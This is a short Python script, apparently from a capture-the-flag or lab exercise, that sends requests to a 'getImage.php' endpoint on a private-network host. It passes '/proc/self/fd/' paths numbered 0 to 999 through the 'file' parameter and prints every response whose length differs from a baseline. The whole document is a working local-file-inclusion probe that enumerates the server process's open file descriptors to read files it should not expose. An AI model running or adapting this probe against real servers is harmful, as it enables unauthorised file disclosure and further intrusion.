import requests

url = 'http://192.168.1.5/cgi-data/getImage.php?file=/proc/self/fd/'

for i in range(1000):
    r = requests.get(url + str(i))
    if (len(r.text) != 241):
        print(f"{i} - {len(r.text)}")